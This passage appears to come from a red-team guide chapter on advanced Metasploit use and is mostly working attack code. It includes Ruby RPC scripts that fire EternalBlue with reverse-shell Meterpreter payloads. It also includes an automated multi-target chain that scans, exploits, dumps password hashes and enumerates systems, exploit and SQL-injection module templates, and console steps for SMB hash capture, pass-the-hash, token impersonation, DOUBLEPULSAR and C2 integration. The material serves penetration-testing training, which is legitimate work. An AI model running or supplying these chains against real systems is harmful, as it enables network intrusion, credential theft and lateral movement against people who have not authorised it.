    # Run commands in the session
    print(shell.run_shell_cmd('whoami'))
    print(shell.run_shell_cmd('ipconfig'))
```

#### Ruby Scripting for Metasploit

```ruby
#!/usr/bin/env ruby

require 'msfrpc-client'

# Connect to the Metasploit RPC server
client = Msf::RPC::Client.new(
  :user     => 'msf',
  :pass     => 'password',
  :host     => '127.0.0.1',
  :port     => 55553,
  :ssl      => true
)

# Get a console instance
console_id = client.call('console.create')['id']

# Execute commands
client.call('console.write', [console_id, "use exploit/windows/smb/ms17_010_eternalblue\n"])
client.call('console.write', [console_id, "set RHOSTS 192.168.1.100\n"])
client.call('console.write', [console_id, "set PAYLOAD windows/x64/meterpreter/reverse_tcp\n"])
client.call('console.write', [console_id, "set LHOST 192.168.1.200\n"])
client.call('console.write', [console_id, "exploit -j\n"])

# Wait for the command to complete
result = ""
while result !~ /Exploit running as background job/
  sleep(1)
  result = client.call('console.read', [console_id])['data']
  puts result if result.length > 0
end

# Check for sessions
sessions = client.call('session.list')
puts "Active sessions: #{sessions}"

# Interact with a session if available
if sessions.length > 0
  session_id = sessions.keys.first
  
  # Run commands on the session
  client.call('session.shell_write', [session_id, "whoami\n"])
  sleep(1)
  output = client.call('session.shell_read', [session_id])
  puts "Command output: #{output}"
end

# Clean up
client.call('console.destroy', [console_id])
```

### Example: Creating Custom Automated Attack Chains

This example demonstrates a comprehensive automated attack chain using Metasploit's Ruby API:

```ruby
#!/usr/bin/env ruby
require 'msfrpc-client'
require 'json'
require 'optparse'

options = {
  :targets_file => nil,
  :output_file => "results.json",
  :msf_host => "127.0.0.1",
  :msf_port => 55553,
  :msf_user => "msf",
  :msf_pass => "abc123"
}

OptionParser.new do |opts|
  opts.banner = "Usage: attack_chain.rb [options]"
  opts.on("-t", "--targets FILE", "Target list file") { |v| options[:targets_file] = v }
  opts.on("-o", "--output FILE", "Output file (default: results.json)") { |v| options[:output_file] = v }
  opts.on("-h", "--help", "Show this help message") { puts opts; exit }
end.parse!

if options[:targets_file].nil?
  puts "Error: Target list file is required"
  exit 1
end

# Read targets
targets = File.readlines(options[:targets_file]).map(&:strip)
results = {}

# Connect to MSF RPC
client = Msf::RPC::Client.new(
  :host => options[:msf_host],
  :port => options[:msf_port],
  :username => options[:msf_user],
  :password => options[:msf_pass],
  :ssl => true
)

# Authenticate
auth_token = client.login(options[:msf_user], options[:msf_pass])

# Attack chain function
def attack_target(client, target)
  target_results = { "host" => target, "scans" => {}, "exploits" => {}, "post" => {} }
  
  # Scan the target
  puts "[*] Scanning #{target}..."
  client.call("module.use", "auxiliary", "scanner/portscan/tcp")
  client.call("module.execute", "auxiliary", "scanner/portscan/tcp", {
    'RHOSTS' => target,
    'PORTS' => "21-25,80,135,139,443,445,3389,5985",
    'THREADS' => 10
  })
  
  # Check for SMB
  client.call("module.use", "auxiliary", "scanner/smb/smb_version")
  smb_result = client.call("module.execute", "auxiliary", "scanner/smb/smb_version", {
    'RHOSTS' => target
  })
  target_results["scans"]["smb_version"] = smb_result
  
  # Try EternalBlue if SMB is detected
  begin
    puts "[*] Attempting MS17-010 EternalBlue against #{target}..."
    client.call("module.use", "exploit", "windows/smb/ms17_010_eternalblue")
    eb_result = client.call("module.execute", "exploit", "windows/smb/ms17_010_eternalblue", {
      'RHOSTS' => target,
      'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',
      'LHOST' => client.call("core.local_address"),
      'LPORT' => 4444
    })
    target_results["exploits"]["eternalblue"] = eb_result
    
    # Check for new sessions
    sleep 5
    sessions = client.call("session.list")
    
    # Run post-exploitation on new sessions
    sessions.each do |id, session|
      if session["target_host"] == target
        puts "[+] Running post-exploitation on session #{id} (#{target})"
        
        # Hashdump
        client.call("module.use", "post", "windows/gather/hashdump")
        hd_result = client.call("module.execute", "post", "windows/gather/hashdump", {
          'SESSION' => id
        })
        target_results["post"]["hashdump"] = hd_result
        
        # Get system info
        client.call("module.use", "post", "windows/gather/enum_system")
        si_result = client.call("module.execute", "post", "windows/gather/enum_system", {
          'SESSION' => id
        })
        target_results["post"]["system_info"] = si_result
      end
    end
  rescue => e
    puts "[-] Error exploiting #{target}: #{e.message}"
    target_results["exploits"]["eternalblue_error"] = e.message
  end
  
  return target_results
end

# Process all targets
puts "[*] Starting attack chain on #{targets.size} targets"
targets.each do |target|
  results[target] = attack_target(client, target)
end

# Save results
File.write(options[:output_file], JSON.pretty_generate(results))
puts "[+] Results saved to #{options[:output_file]}"
```

Execute the attack chain:
```bash
./attack_chain.rb -t targets.txt -o campaign_results.json
```

### Building Custom Modules

Creating custom Metasploit modules allows you to integrate specialized exploits, scanners, or post-exploitation capabilities.

#### Basic Module Structure

```ruby
# Example auxiliary scanner module structure
# Save as: ~/.msf4/modules/auxiliary/scanner/http/custom_scanner.rb

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom HTTP Vulnerability Scanner',
      'Description'    => %q{
        This module scans for a specific vulnerability in web applications.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Your Name' ],
      'References'     => [
        [ 'CVE', '2023-XXXXX' ],
        [ 'URL', 'https://example.com/vulnerability-details' ]
      ],
      'DisclosureDate' => '2023-01-01'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to the vulnerable application', '/']),
        OptString.new('VULNPARAM', [true, 'Vulnerable parameter name', 'id'])
      ], self.class
    )
  end

  def run_host(ip)
    uri = normalize_uri(target_uri.path)
    
    print_status("Scanning #{ip} at #{uri}")
    
    # Build the vulnerable request
    res = send_request_cgi({
      'method'    => 'GET',
      'uri'       => uri,
      'vars_get'  => {
        datastore['VULNPARAM'] => "1' OR '1'='1"
      }
    })

    if res && res.code == 200 && res.body.include?('error in your SQL syntax')
      print_good("#{ip} appears vulnerable to SQL injection")
      
      # Report the vulnerability
      report_vuln(
        :host  => ip,
        :port  => rport,
        :proto => 'tcp',
        :name  => "SQL Injection in #{datastore['VULNPARAM']} parameter",
        :refs  => references
      )
    else
      print_status("#{ip} does not appear vulnerable")
    end
  end
end
```

#### Testing Custom Modules

```bash
# Reload the modules to see your new addition
msf6 > reload_all

# Use your custom module
msf6 > use auxiliary/scanner/http/custom_scanner
msf6 auxiliary(scanner/http/custom_scanner) > info
msf6 auxiliary(scanner/http/custom_scanner) > show options
msf6 auxiliary(scanner/http/custom_scanner) > set RHOSTS 192.168.1.100
msf6 auxiliary(scanner/http/custom_scanner) > run
```

#### Creating a Custom Exploit Module

```ruby
# Example exploit module
# Save as: ~/.msf4/modules/exploits/windows/http/custom_exploit.rb

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Custom Web Application Exploit',
      'Description'    => %q{
        This module exploits a vulnerability in XYZ application.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Your Name' ],
      'References'     => [
        [ 'CVE', '2023-XXXXX' ],
        [ 'URL', 'https://example.com/vulnerability-details' ]
      ],
      'Platform'       => 'win',
      'Targets'        => [
        [ 'Windows 10', { 'Ret' => 0x41414141 } ]
      ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2023-01-01'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Path to the vulnerable application', '/']),
      ], self.class
    )
  end

  def check
    # Implementation of check method
    uri = normalize_uri(target_uri.path)
    
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => uri
    })

    if res && res.code == 200 && res.body.include?('Vulnerable App v1.0')
      return Exploit::CheckCode::Appears
    end

    return Exploit::CheckCode::Safe
  end

  def exploit
    # Implementation of exploit method
    print_status("Exploiting the vulnerability...")
    
    # Create the malicious payload
    payload_cmd = Rex::Text.encode_base64(payload.encoded)
    
    # Send the exploit
    res = send_request_cgi({
      'method'    => 'POST',
      'uri'       => normalize_uri(target_uri.path, 'admin', 'upload.php'),
      'vars_post' => {
        'action'  => 'upload',
        'data'    => payload_cmd
      }
    })

    if res && res.code == 200 && res.body.include?('Success')
      print_good("Exploit successful!")
    else
      fail_with(Failure::UnexpectedReply, "Exploit failed")
    end
  end
end
```

## Advanced Metasploit Modules

Metasploit offers numerous advanced modules not covered in the basic documentation. Here are some powerful examples:

### Auxiliary Modules

**SMB Relay Attack**:
```
msf6 > use auxiliary/server/capture/smb
msf6 auxiliary(server/capture/smb) > set JOHNPWFILE /tmp/hashes.txt
msf6 auxiliary(server/capture/smb) > run
```

**SSH Key Verification**:
```
msf6 > use auxiliary/scanner/ssh/ssh_identify_pubkeys
msf6 auxiliary(scanner/ssh/ssh_identify_pubkeys) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(scanner/ssh/ssh_identify_pubkeys) > set KEY_FILE /path/to/id_rsa.pub
msf6 auxiliary(scanner/ssh/ssh_identify_pubkeys) > run
```

### Exploit Modules

**PowerShell Empire Integration**:
```
msf6 > use exploit/windows/local/powershell_empire_launcher
msf6 exploit(windows/local/powershell_empire_launcher) > set SESSION 1
msf6 exploit(windows/local/powershell_empire_launcher) > set LHOST 192.168.1.5
msf6 exploit(windows/local/powershell_empire_launcher) > set LPORT 8080
msf6 exploit(windows/local/powershell_empire_launcher) > run
```

**DOUBLEPULSAR Backdoor Exploiter**:
```
msf6 > use exploit/windows/smb/smb_doublepulsar_rce
msf6 exploit(windows/smb/smb_doublepulsar_rce) > set RHOSTS 192.168.1.10
msf6 exploit(windows/smb/smb_doublepulsar_rce) > set DOUBLEPULSARPATH /path/to/doublepulsar
msf6 exploit(windows/smb/smb_doublepulsar_rce) > run
```

### Post Modules

**Pass-the-Hash**:
```
msf6 > use exploit/windows/smb/psexec_psh
msf6 exploit(windows/smb/psexec_psh) > set SMBDomain WORKGROUP
msf6 exploit(windows/smb/psexec_psh) > set SMBUser Administrator
msf6 exploit(windows/smb/psexec_psh) > set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
msf6 exploit(windows/smb/psexec_psh) > set RHOSTS 192.168.1.11
msf6 exploit(windows/smb/psexec_psh) > run
```

**Token Impersonation**:
```
meterpreter > use incognito
meterpreter > list_tokens -u
meterpreter > impersonate_token DOMAIN\\Administrator
```

## Metasploit Extensions

Metasploit can be extended with third-party modules and plugins to enhance red team capabilities:

### Koadic Integration

Integrate Koadic (COM Command & Control) with Metasploit:

```bash
# In Metasploit
msf6 > load import
msf6 > irb
>> require 'koadic'
>> koadic = Koadic.new
>> koadic.start_listener('http', '192.168.1.5', 9999)
```

### CobaltStrike Compatibility

Use Aggressor scripts to integrate Metasploit with CobaltStrike:

```
# In CobaltStrike's Aggressor Script Console
msf_rpc_host = "127.0.0.1";
msf_rpc_port = "55553";
msf_rpc_user = "msf";
msf_rpc_pass = "abc123";

# Connect to MSF RPC
$msf_api = msf_connect($msf_rpc_host, $msf_rpc_port, $msf_rpc_user, $msf_rpc_pass);

# Import sessions into CS
msf_import_sessions($msf_api);
```

## Conclusion

The Metasploit Framework represents the most comprehensive exploitation platform available to red teamers. Its modular architecture, extensive library of exploits and payloads, and powerful post-exploitation capabilities make it the cornerstone of any offensive security toolkit.

In this chapter, we've explored advanced usage patterns beyond basic exploitation, focusing on:

1. **Efficient console usage** - Mastering the interface for complex operations
2. **Database integration** - Managing discovery and exploitation across large networks
3. **Payload generation** - Creating advanced, evasive payloads for different scenarios
4. **Post-exploitation modules** - Leveraging access for comprehensive system enumeration
5. **Pivoting techniques** - Using compromised systems to access deeper network segments
6. **Automation** - Building sophisticated attack chains for repeatable operations

Remember that with great power comes great responsibility. The Metasploit Framework provides capabilities that could cause significant damage if misused. Always ensure you have proper authorization before using these techniques, and operate within the scope of your engagement.

### Additional Resources

- [Official Metasploit Documentation](https://docs.metasploit.com/)
- [Offensive Security Metasploit Unleashed](https://www.offensive-security.com/metasploit-unleashed/)
- [Rapid7 Blog](https://blog.rapid7.com/tag/metasploit/)
- [Metasploit GitHub Repository](https://github.com/rapid7/metasploit-framework)
- [Metasploit Minute Video Series](https://www.youtube.com/playlist?list=PLMrNV6nsC4xr5orRR5nNT1iKQssw43S_n)
